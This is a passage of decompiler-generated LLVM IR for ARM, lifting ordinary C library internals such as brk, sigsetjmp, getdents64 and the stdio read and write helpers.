  store i32 %v1_19928, i32* %r3.global-to-local, align 4
  %v1_1992c = inttoptr i32 %v1_19928 to i32*
  %v2_1992c = load i32, i32* %v1_1992c, align 4
  store i32 %v2_1992c, i32* %r2.global-to-local, align 4
  %v3_1992c = add i32 %v0_19928, 24
  %v4_1992c = inttoptr i32 %v3_1992c to i32*
  %v5_1992c = load i32, i32* %v4_1992c, align 4
  store i32 %v5_1992c, i32* %r3.global-to-local, align 4
  %v2_19930 = sub i32 %v5_1992c, %v2_1992c
  store i32 %v2_19930, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_19938 = inttoptr i32 %v5_19924 to i8*
  %v4_19938 = call i32 @__GI_memset(i8* %v3_19938, i32 0, i32 %v2_19930)
  ret i32 %v4_19938

; uselistorder directives
  uselistorder i32 %v3_19904, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 7, 8, 0, 1, 3, 2, 12, 11, 9, 4, 5, 6, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_19988:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 11580) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_1999c = load i32, i32* @r0, align 4
  %v1_199a0 = inttoptr i32 %v0_1999c to i32*
  %v2_199a0 = load i32, i32* @r4, align 4
  store i32 %v2_199a0, i32* %v1_199a0, align 4
  %v3_199a0 = add i32 %v0_1999c, 4
  %v4_199a0 = inttoptr i32 %v3_199a0 to i32*
  %v5_199a0 = load i32, i32* @r5, align 4
  store i32 %v5_199a0, i32* %v4_199a0, align 4
  %v6_199a0 = add i32 %v0_1999c, 8
  %v7_199a0 = inttoptr i32 %v6_199a0 to i32*
  %v8_199a0 = load i32, i32* @r6, align 4
  store i32 %v8_199a0, i32* %v7_199a0, align 4
  %v9_199a0 = add i32 %v0_1999c, 12
  %v10_199a0 = inttoptr i32 %v9_199a0 to i32*
  %v11_199a0 = load i32, i32* @r7, align 4
  store i32 %v11_199a0, i32* %v10_199a0, align 4
  %v12_199a0 = add i32 %v0_1999c, 16
  %v13_199a0 = inttoptr i32 %v12_199a0 to i32*
  %v14_199a0 = load i32, i32* @r8, align 4
  store i32 %v14_199a0, i32* %v13_199a0, align 4
  %v15_199a0 = add i32 %v0_1999c, 20
  %v16_199a0 = inttoptr i32 %v15_199a0 to i32*
  %v17_199a0 = load i32, i32* @sb, align 4
  store i32 %v17_199a0, i32* %v16_199a0, align 4
  %v18_199a0 = add i32 %v0_1999c, 24
  %v19_199a0 = inttoptr i32 %v18_199a0 to i32*
  %v20_199a0 = load i32, i32* @sl, align 4
  store i32 %v20_199a0, i32* %v19_199a0, align 4
  %v21_199a0 = add i32 %v0_1999c, 28
  %v22_199a0 = inttoptr i32 %v21_199a0 to i32*
  %v23_199a0 = load i32, i32* @fp, align 4
  store i32 %v23_199a0, i32* %v22_199a0, align 4
  %v24_199a0 = add i32 %v0_1999c, 32
  %v25_199a0 = inttoptr i32 %v24_199a0 to i32*
  %v27_199a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_199a0, i32* %v25_199a0, align 4
  %v28_199a0 = add i32 %v0_1999c, 36
  %v29_199a0 = inttoptr i32 %v28_199a0 to i32*
  %v30_199a0 = load i32, i32* @lr, align 4
  store i32 %v30_199a0, i32* %v29_199a0, align 4
  %v0_199a4 = call i32 @__sigjmp_save()
  ret i32 %v0_199a4

; uselistorder directives
  uselistorder i32 %v0_1999c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 99, 100, 4, 5, 6, 7, 8, 9, 10, 11, 86, 87, 88, 89, 95, 97, 96, 98, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 90, 91, 92, 2, 93, 94 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_199ac = load i32, i32* @r5, align 4
  %v12_199ac = load i32, i32* @r7, align 4
  %v1_199b0 = add i32 %arg3, 14
  %v2_199b8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_199bc = and i32 %v1_199b0, -8
  %v2_199c0 = sub i32 %v2_199b8, %v1_199bc
  %v1_199c4 = add i32 %v2_199c0, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_19a08, label %dec_label_pc_199ec

dec_label_pc_199ec:                               ; preds = %entry
  %v1_199f0 = sub i32 0, %arg1
  %v3_199f4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_199f4 = sext i16 %v3_199f4 to i32
  %v0_199f8 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19a00 = add i32 %v4_199f4, %v0_199f8
  %v4_19a00 = inttoptr i32 %v3_19a00 to i32*
  store i32 %v1_199f0, i32* %v4_19a00, align 4
  br label %dec_label_pc_19ad8

dec_label_pc_19a08:                               ; preds = %entry
  br i1 false, label %dec_label_pc_19ad8, label %dec_label_pc_19a10

dec_label_pc_19a10:                               ; preds = %dec_label_pc_19a08
  %v2_19a10 = add i32 %v1_199c4, %arg1
  store i32 %v2_19a10, i32* %r1.global-to-local, align 4
  %v2_19a14 = add i32 %tmp, %arg3
  store i32 %v1_199c4, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19ac0

dec_label_pc_19a30:                               ; preds = %dec_label_pc_19ac0
  %v1_19a30 = add i32 %v0_19a90, 16
  %v2_19a30 = inttoptr i32 %v1_19a30 to i16*
  %v3_19a30 = load i16, i16* %v2_19a30, align 2
  %v4_19a30 = zext i16 %v3_19a30 to i32
  %v1_19a34 = add nsw i32 %v4_19a30, -19
  store i32 %v1_19a34, i32* @r2, align 4
  %v1_19a38 = add nuw nsw i32 %v4_19a30, 7
  %v1_19a3c = and i32 %v1_19a38, 131064
  store i32 %v1_19a3c, i32* @ip, align 4
  %v2_19a44 = add i32 %v1_19a3c, %v0_19a98
  store i32 %v2_19a44, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_19a44, %v2_19a14
  br i1 %tmp24, label %dec_label_pc_19a50, label %dec_label_pc_19a8c

dec_label_pc_19a50:                               ; preds = %dec_label_pc_19a30
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19a58 = load i32, i32* %r8.global-to-local, align 4
  %v0_19a5c = load i32, i32* %sb.global-to-local, align 4
  %v1_19a60 = load i32, i32* @sp, align 4
  %v2_19a60 = inttoptr i32 %v1_19a60 to i32*
  store i32 0, i32* %v2_19a60, align 4
  %v4_19a64 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_19a58, i32 %v0_19a5c)
  %v0_19a68 = load i32, i32* @r5, align 4
  %v1_19a68 = load i32, i32* %sl.global-to-local, align 4
  %v9_19a68 = icmp eq i32 %v0_19a68, %v1_19a68
  br i1 %v9_19a68, label %dec_label_pc_19a70, label %dec_label_pc_19ad4

dec_label_pc_19a70:                               ; preds = %dec_label_pc_19a50
  %v0_19a74 = call i32 @__aeabi_read_tp()
  %v3_19a78 = load i16, i16* @global_var_2447c.761, align 2
  %v4_19a78 = sext i16 %v3_19a78 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19a84 = add i32 %v4_19a78, %v0_19a74
  %v4_19a84 = inttoptr i32 %v3_19a84 to i32*
  store i32 22, i32* %v4_19a84, align 4
  br label %dec_label_pc_19ad8

dec_label_pc_19a8c:                               ; preds = %dec_label_pc_19a30
  %v1_19a8c = inttoptr i32 %v0_19a90 to i32*
  %v2_19a8c = load i32, i32* %v1_19a8c, align 4
  %v3_19a8c = add i32 %v0_19a90, 4
  %v4_19a8c = inttoptr i32 %v3_19a8c to i32*
  %v5_19a8c = load i32, i32* %v4_19a8c, align 4
  store i32 %v5_19a8c, i32* @r4, align 4
  %v1_19a90 = add i32 %v0_19a90, 8
  store i32 %v1_19a90, i32* %r8.global-to-local, align 4
  %v1_19a94 = inttoptr i32 %v1_19a90 to i32*
  %v2_19a94 = load i32, i32* %v1_19a94, align 4
  store i32 %v2_19a94, i32* %r8.global-to-local, align 4
  %v3_19a94 = add i32 %v0_19a90, 12
  %v4_19a94 = inttoptr i32 %v3_19a94 to i32*
  %v5_19a94 = load i32, i32* %v4_19a94, align 4
  store i32 %v5_19a94, i32* %sb.global-to-local, align 4
  %v1_19a98 = inttoptr i32 %v0_19a98 to i32*
  store i32 %v2_19a8c, i32* %v1_19a98, align 4
  %v3_19a98 = add i32 %v0_19a98, 4
  %v4_19a98 = inttoptr i32 %v3_19a98 to i32*
  %v5_19a98 = load i32, i32* @r4, align 4
  store i32 %v5_19a98, i32* %v4_19a98, align 4
  %v0_19a9c = load i32, i32* %r8.global-to-local, align 4
  %v1_19a9c = load i32, i32* @r5, align 4
  %v2_19a9c = add i32 %v1_19a9c, 8
  %v3_19a9c = inttoptr i32 %v2_19a9c to i32*
  store i32 %v0_19a9c, i32* %v3_19a9c, align 4
  %v0_19aa0 = load i32, i32* %sb.global-to-local, align 4
  %v1_19aa0 = load i32, i32* @r5, align 4
  %v2_19aa0 = add i32 %v1_19aa0, 12
  %v3_19aa0 = inttoptr i32 %v2_19aa0 to i32*
  store i32 %v0_19aa0, i32* %v3_19aa0, align 4
  %v0_19aa4 = load i32, i32* @ip, align 4
  %v1_19aa4 = trunc i32 %v0_19aa4 to i16
  %v2_19aa4 = load i32, i32* @r5, align 4
  %v3_19aa4 = add i32 %v2_19aa4, 16
  %v4_19aa4 = inttoptr i32 %v3_19aa4 to i16*
  store i16 %v1_19aa4, i16* %v4_19aa4, align 2
  %v0_19aa8 = load i32, i32* @r7, align 4
  %v1_19aa8 = add i32 %v0_19aa8, 18
  %v2_19aa8 = inttoptr i32 %v1_19aa8 to i8*
  %v3_19aa8 = load i8, i8* %v2_19aa8, align 1
  %v4_19aa8 = zext i8 %v3_19aa8 to i32
  store i32 %v4_19aa8, i32* @r3, align 4
  %v2_19aac = load i32, i32* @r5, align 4
  %v3_19aac = add i32 %v2_19aac, 18
  %v4_19aac = inttoptr i32 %v3_19aac to i8*
  store i8 %v3_19aa8, i8* %v4_19aac, align 1
  %v0_19ab0 = call i32 @memcpy()
  %v0_19ab4 = load i32, i32* @r7, align 4
  %v1_19ab4 = add i32 %v0_19ab4, 16
  %v2_19ab4 = inttoptr i32 %v1_19ab4 to i16*
  %v3_19ab4 = load i16, i16* %v2_19ab4, align 2
  %v4_19ab4 = zext i16 %v3_19ab4 to i32
  %v0_19ab8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19ab8, i32* @r5, align 4
  %v2_19abc = add i32 %v4_19ab4, %v0_19ab4
  store i32 %v2_19abc, i32* @r7, align 4
  br label %dec_label_pc_19ac0

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_19a10, %dec_label_pc_19a8c
  %v0_19a98 = phi i32 [ %tmp, %dec_label_pc_19a10 ], [ %v0_19ab8, %dec_label_pc_19a8c ]
  %v0_19a90 = phi i32 [ %v1_199c4, %dec_label_pc_19a10 ], [ %v2_19abc, %dec_label_pc_19a8c ]
  %v3_19ac4 = icmp ult i32 %v0_19a90, %v2_19a10
  %v1_19ac8 = add i32 %v0_19a98, 19
  store i32 %v1_19ac8, i32* @r0, align 4
  %v1_19acc = add i32 %v0_19a90, 19
  store i32 %v1_19acc, i32* @r1, align 4
  br i1 %v3_19ac4, label %dec_label_pc_19a30, label %dec_label_pc_19ad4.loopexit

dec_label_pc_19ad4.loopexit:                      ; preds = %dec_label_pc_19ac0
  %v0_19ad4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19ad4

dec_label_pc_19ad4:                               ; preds = %dec_label_pc_19ad4.loopexit, %dec_label_pc_19a50
  %v1_19ad4 = phi i32 [ %v0_19a98, %dec_label_pc_19ad4.loopexit ], [ %v0_19a68, %dec_label_pc_19a50 ]
  %v0_19ad4 = phi i32 [ %v0_19ad4.pre, %dec_label_pc_19ad4.loopexit ], [ %v1_19a68, %dec_label_pc_19a50 ]
  %v2_19ad4 = sub i32 %v1_19ad4, %v0_19ad4
  store i32 %v2_19ad4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19ad8

dec_label_pc_19ad8:                               ; preds = %dec_label_pc_19a08, %dec_label_pc_19a70, %dec_label_pc_199ec, %dec_label_pc_19ad4
  %v0_19ad8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_199ac, i32* @r5, align 4
  store i32 %v12_199ac, i32* @r7, align 4
  ret i32 %v0_19ad8

; uselistorder directives
  uselistorder i32 %v0_19a90, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_19a98, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_199c4, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 3, 4, 0, 1, 5, 6, 7, 2, 8 }
  uselistorder i32 18, { 5, 6, 2, 7, 4, 8, 3, 9, 0, 10, 1, 11 }
  uselistorder i32 22, { 1, 0, 12, 2, 3, 4, 5, 6, 9, 7, 10, 8, 11, 13 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 4, 3, 2, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_19ad8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19ac0, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19af0 = load i32, i32* @r4, align 4
  store i32 %v3_19af0, i32* %stack_var_-12, align 4
  %v0_19af4 = load i32, i32* %r0.global-to-local, align 4
  %v1_19af4 = inttoptr i32 %v0_19af4 to i16*
  %v2_19af4 = load i16, i16* %v1_19af4, align 2
  %v3_19af4 = zext i16 %v2_19af4 to i32
  store i32 %v3_19af4, i32* @r3, align 4
  %v1_19af8 = and i32 %v3_19af4, 4
  store i32 %v1_19af8, i32* @r5, align 4
  %v2_19af8 = icmp eq i32 %v1_19af8, 0
  store i32 %v0_19af4, i32* @r4, align 4
  br i1 %v2_19af8, label %dec_label_pc_19b0c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_19b0c:                               ; preds = %entry
  %v1_19b0c = icmp slt i32 %arg2, 0
  br i1 %v1_19b0c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_19b0c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_19b0c, %bb18
  %v1_19b14 = add i32 %v0_19af4, 4
  %v2_19b14 = inttoptr i32 %v1_19b14 to i32*
  %v3_19b14 = load i32, i32* %v2_19b14, align 4
  store i32 %v3_19b14, i32* %r0.global-to-local, align 4
  %v1_19b18 = call i32 @__libc_read(i32 %v3_19b14)
  store i32 %v1_19b18, i32* %r0.global-to-local, align 4
  %v5_19b20 = icmp sgt i32 %v1_19b18, 0
  br i1 %v5_19b20, label %.thread7, label %dec_label_pc_19b24

dec_label_pc_19b24:                               ; preds = %bb19
  %v2_19b1c = icmp eq i32 %v1_19b18, 0
  %v0_19b24 = load i32, i32* @r4, align 4
  %v1_19b24 = inttoptr i32 %v0_19b24 to i16*
  %v2_19b24 = load i16, i16* %v1_19b24, align 2
  br i1 %v2_19b1c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_19b24
  %v2_19b28 = or i16 %v2_19b24, 4
  store i16 %v2_19b28, i16* %v1_19b24, align 2
  %v1_19b44.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_19b24
  %v2_19b2c = or i16 %v2_19b24, 8
  store i16 %v2_19b2c, i16* %v1_19b24, align 2
  %v1_19b38 = load i32, i32* @r5, align 4
  store i32 %v1_19b38, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_19b44 = phi i32 [ %v1_19b44.pre, %bb20 ], [ 0, %bb ], [ %v1_19b18, %bb19 ], [ %v1_19b38, %bb21 ]
  %v2_19b40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19b40, i32* @r4, align 4
  ret i32 %v1_19b44

; uselistorder directives
  uselistorder i16 %v2_19b24, { 1, 0 }
  uselistorder i32 %v1_19b18, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_19c0c2 = icmp eq i32 %arg3, 0
  store i1 %v2_19c0c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c0c2, label %dec_label_pc_19c14, label %dec_label_pc_19b64

dec_label_pc_19b64:                               ; preds = %entry, %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge
  %v0_19b70 = phi i32 [ %v0_19b70.pre, %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge ], [ %tmp, %entry ]
  %v0_19b6c = phi i32 [ %v5_19b7c, %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge ], [ %arg2, %entry ]
  %v3_19b64 = phi i32 [ %v3_19b64.pre, %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge ], [ 2147483647, %entry ]
  %v0_19b68.in = phi i32 [ %v5_19b80, %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge ], [ %arg3, %entry ]
  %v3_19b68 = phi i32 [ %v5_19b80, %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge ], [ %arg3, %entry ]
  %v0_19b68 = icmp slt i32 %v0_19b68.in, 0
  %storemerge = select i1 %v0_19b68, i32 %v3_19b64, i32 %v3_19b68
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_19b6c, i32* %r1.global-to-local, align 4
  %v1_19b70 = add i32 %v0_19b70, 4
  %v2_19b70 = inttoptr i32 %v1_19b70 to i32*
  %v3_19b70 = load i32, i32* %v2_19b70, align 4
  %v3_19b74 = call i32 @__GI___libc_write(i32 %v3_19b70, i32 %v0_19b6c)
  %v1_19b78 = icmp slt i32 %v3_19b74, 0
  %v2_19b78 = icmp eq i32 %v3_19b74, 0
  store i1 %v2_19b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19b78, label %dec_label_pc_19b88, label %dec_label_pc_19c0cthread-pre-split

dec_label_pc_19b88:                               ; preds = %dec_label_pc_19b64
  %v0_19b88 = load i32, i32* @r4, align 4
  %v1_19b88 = inttoptr i32 %v0_19b88 to i16*
  %v2_19b88 = load i16, i16* %v1_19b88, align 2
  %v1_19b8c = or i16 %v2_19b88, 8
  store i16 %v1_19b8c, i16* %v1_19b88, align 2
  store i32 43224, i32* %r3.global-to-local, align 4
  %v0_19b98 = call i32 @__aeabi_read_tp()
  %v3_19b9c = load i16, i16* @global_var_2447c.761, align 2
  %v4_19b9c = sext i16 %v3_19b9c to i32
  store i32 %v4_19b9c, i32* %r3.global-to-local, align 4
  %v2_19ba0 = add i32 %v4_19b9c, %v0_19b98
  %v3_19ba0 = inttoptr i32 %v2_19ba0 to i32*
  %v4_19ba0 = load i32, i32* %v3_19ba0, align 4
  store i32 %v4_19ba0, i32* %r3.global-to-local, align 4
  %v7_19ba4 = icmp eq i32 %v4_19ba0, 4
  store i1 %v7_19ba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19ba4, label %dec_label_pc_19bb0, label %bb21

bb21:                                             ; preds = %dec_label_pc_19b88
  %v8_19ba8 = icmp eq i32 %v4_19ba0, 11
  store i1 %v8_19ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19ba8, label %dec_label_pc_19bb0, label %dec_label_pc_19c14

dec_label_pc_19bb0:                               ; preds = %dec_label_pc_19b88, %bb21
  %v0_19bb0 = load i32, i32* @r4, align 4
  %v1_19bb0 = add i32 %v0_19bb0, 8
  store i32 %v1_19bb0, i32* %r2.global-to-local, align 4
  %v1_19bb4 = inttoptr i32 %v1_19bb0 to i32*
  %v2_19bb4 = load i32, i32* %v1_19bb4, align 4
  store i32 %v2_19bb4, i32* %r2.global-to-local, align 4
  %v3_19bb4 = add i32 %v0_19bb0, 12
  %v4_19bb4 = inttoptr i32 %v3_19bb4 to i32*
  %v5_19bb4 = load i32, i32* %v4_19bb4, align 4
  store i32 %v5_19bb4, i32* %r3.global-to-local, align 4
  %v2_19bb8 = sub i32 %v5_19bb4, %v2_19bb4
  store i32 %v2_19bb8, i32* %r1.global-to-local, align 4
  %v9_19bb8 = icmp eq i32 %v5_19bb4, %v2_19bb4
  store i1 %v9_19bb8, i1* %cpsr_z.global-to-local, align 1
  %v0_19c04.pre = load i32, i32* @r5, align 4
  br i1 %v9_19bb8, label %dec_label_pc_19c04, label %dec_label_pc_19bc0

dec_label_pc_19bc0:                               ; preds = %dec_label_pc_19bb0
  %v3_19bc0 = icmp ult i32 %v2_19bb8, %v0_19c04.pre
  %v9_19bc0 = icmp eq i32 %v2_19bb8, %v0_19c04.pre
  store i1 %v9_19bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19bc0, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_19bc0
  store i32 %v0_19c04.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19bc0, %bb22, %dec_label_pc_19be8
  %v2_19bd4 = phi i32 [ %v1_19bec, %dec_label_pc_19be8 ], [ %v2_19bb4, %bb22 ], [ %v2_19bb4, %dec_label_pc_19bc0 ]
  %v0_19bc8 = load i32, i32* @r6, align 4
  %v1_19bc8 = inttoptr i32 %v0_19bc8 to i8*
  %v2_19bc8 = load i8, i8* %v1_19bc8, align 1
  %v3_19bc8 = zext i8 %v2_19bc8 to i32
  store i32 %v3_19bc8, i32* %r3.global-to-local, align 4
  %v7_19bcc = icmp eq i8 %v2_19bc8, 10
  store i1 %v7_19bcc, i1* %cpsr_z.global-to-local, align 1
  %v1_19bd0 = add i32 %v0_19bc8, 1
  store i32 %v1_19bd0, i32* @r6, align 4
  %v3_19bd4 = inttoptr i32 %v2_19bd4 to i8*
  store i8 %v2_19bc8, i8* %v3_19bd4, align 1
  %v0_19bd8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19bd8, label %dec_label_pc_19bdc, label %dec_label_pc_19be8

dec_label_pc_19bdc:                               ; preds = %.preheader
  %v0_19bdc = load i32, i32* @r4, align 4
  %v1_19bdc = inttoptr i32 %v0_19bdc to i16*
  %v2_19bdc = load i16, i16* %v1_19bdc, align 2
  %v3_19bdc = zext i16 %v2_19bdc to i32
  store i32 %v3_19bdc, i32* %r3.global-to-local, align 4
  %v1_19be0 = and i32 %v3_19bdc, 256
  %v2_19be0 = icmp eq i32 %v1_19be0, 0
  store i1 %v2_19be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19be0, label %dec_label_pc_19be8, label %dec_label_pc_19bdc.dec_label_pc_19bf4_crit_edge

dec_label_pc_19bdc.dec_label_pc_19bf4_crit_edge:  ; preds = %dec_label_pc_19bdc
  %v0_19bf8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19bf4

dec_label_pc_19be8:                               ; preds = %dec_label_pc_19bdc, %.preheader
  %v0_19be8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19be8 = add i32 %v0_19be8, -1
  store i32 %v1_19be8, i32* %r1.global-to-local, align 4
  %v7_19be8 = icmp eq i32 %v0_19be8, 1
  store i1 %v7_19be8, i1* %cpsr_z.global-to-local, align 1
  %v0_19bec = load i32, i32* %r2.global-to-local, align 4
  %v1_19bec = add i32 %v0_19bec, 1
  store i32 %v1_19bec, i32* %r2.global-to-local, align 4
  br i1 %v7_19be8, label %dec_label_pc_19be8.dec_label_pc_19bf4_crit_edge, label %.preheader

dec_label_pc_19be8.dec_label_pc_19bf4_crit_edge:  ; preds = %dec_label_pc_19be8
  %v0_19bf4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19bf4

dec_label_pc_19bf4:                               ; preds = %dec_label_pc_19bdc.dec_label_pc_19bf4_crit_edge, %dec_label_pc_19be8.dec_label_pc_19bf4_crit_edge
  %v0_19bf8 = phi i32 [ %v1_19bec, %dec_label_pc_19be8.dec_label_pc_19bf4_crit_edge ], [ %v0_19bf8.pre, %dec_label_pc_19bdc.dec_label_pc_19bf4_crit_edge ]
  %v0_19bf4 = phi i32 [ %v0_19bf4.pre, %dec_label_pc_19be8.dec_label_pc_19bf4_crit_edge ], [ %v0_19bdc, %dec_label_pc_19bdc.dec_label_pc_19bf4_crit_edge ]
  %v1_19bf4 = add i32 %v0_19bf4, 8
  %v2_19bf4 = inttoptr i32 %v1_19bf4 to i32*
  %v3_19bf4 = load i32, i32* %v2_19bf4, align 4
  store i32 %v3_19bf4, i32* %r3.global-to-local, align 4
  %v2_19bf8 = add i32 %v0_19bf4, 16
  %v3_19bf8 = inttoptr i32 %v2_19bf8 to i32*
  store i32 %v0_19bf8, i32* %v3_19bf8, align 4
  %v0_19bfc = load i32, i32* %r3.global-to-local, align 4
  %v1_19bfc = load i32, i32* %r2.global-to-local, align 4
  %v2_19bfc = sub i32 %v1_19bfc, %v0_19bfc
  store i32 %v2_19bfc, i32* %r3.global-to-local, align 4
  %v1_19c00 = load i32, i32* @r5, align 4
  %v2_19c00 = sub i32 %v1_19c00, %v2_19bfc
  br label %dec_label_pc_19c04

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19bb0, %dec_label_pc_19bf4
  %v0_19c04 = phi i32 [ %v2_19c00, %dec_label_pc_19bf4 ], [ %v0_19c04.pre, %dec_label_pc_19bb0 ]
  %v1_19c04 = load i32, i32* @r7, align 4
  %v2_19c04 = sub i32 %v1_19c04, %v0_19c04
  store i32 %v2_19c04, i32* @r7, align 4
  br label %dec_label_pc_19c14

dec_label_pc_19c0cthread-pre-split:               ; preds = %dec_label_pc_19b64
  %v3_19b7c = load i32, i32* @r6, align 4
  %v5_19b7c = add i32 %v3_19b7c, %v3_19b74
  store i32 %v5_19b7c, i32* @r6, align 4
  %v4_19b80 = load i32, i32* @r5, align 4
  %v5_19b80 = sub i32 %v4_19b80, %v3_19b74
  store i32 %v5_19b80, i32* @r5, align 4
  %v2_19c0c = icmp eq i32 %v5_19b80, 0
  store i1 %v2_19c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c0c, label %dec_label_pc_19c14, label %dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge

dec_label_pc_19c0cthread-pre-split.dec_label_pc_19b64_crit_edge: ; preds = %dec_label_pc_19c0cthread-pre-split
  %v3_19b64.pre = load i32, i32* @r8, align 4
  %v0_19b70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19b64

dec_label_pc_19c14:                               ; preds = %dec_label_pc_19c0cthread-pre-split, %entry, %bb21, %dec_label_pc_19c04
  %v0_19c14 = load i32, i32* @r7, align 4
  ret i32 %v0_19c14

